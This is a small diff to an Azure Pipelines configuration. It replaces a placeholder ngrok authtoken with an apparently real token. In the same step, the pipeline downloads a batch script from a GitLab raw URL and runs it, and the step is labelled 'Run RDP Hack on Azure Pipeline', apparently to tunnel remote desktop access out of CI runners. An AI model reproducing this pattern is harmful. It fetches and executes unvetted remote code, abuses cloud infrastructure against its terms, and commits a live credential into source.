@@ -5,7 +5,8 @@ jobs:
   steps:
    - checkout: none 
    - script: |
-       echo ngrok authtoken "YOUR_AUTHTOKEN_HERE" > NGROK.bat
+       echo ngrok authtoken "1uOS8TkPghb6V69et6OBezrFNF7_6ABQUV9Q9JygHexVN34UT" > NGROK.bat
        curl -s -O https://gitlab.com/spitdebars/spitdebars/-/raw/master/AzureNgrokAutoRegion.bat
        AzureNgrokAutoRegion.bat
      displayName: 'Run RDP Hack on Azure Pipeline'
+ 
